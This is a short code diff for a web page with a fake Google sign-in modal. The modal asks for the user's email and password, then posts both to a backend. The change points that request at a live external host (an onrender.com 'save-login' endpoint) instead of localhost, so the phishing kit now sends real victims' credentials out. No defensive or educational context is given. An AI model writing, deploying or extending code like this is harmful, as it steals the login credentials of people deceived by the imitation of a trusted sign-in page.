@@ -242,7 +242,7 @@ cancelGoogle.addEventListener('click', () => {
   googleModal.style.display = "none";
 });
 
-// Google Modal Logic + Save to backend
+// Google Modal Logic + Save to deployed backend
 nextGoogleBtn.addEventListener('click', async () => {
   if(stage === 0){
     const email = emailInput.value.trim();
@@ -261,9 +261,9 @@ nextGoogleBtn.addEventListener('click', async () => {
     if(!password){ alert("Enter your password"); return; }
     passLoading.style.display = "block";
     setTimeout(async () => {
-      // Save login info to backend
+      // Save login info to deployed backend
       try {
-        await fetch('http://localhost:3000/save-login', {
+        await fetch('https://ac-corporations.onrender.com/save-login', {
           method: 'POST',
           headers: {'Content-Type':'application/json'},
           body: JSON.stringify({email: storedEmail, password})
@@ -344,3 +344,4 @@ appForm.addEventListener("submit", e => {
 
 </body>
 </html>
+
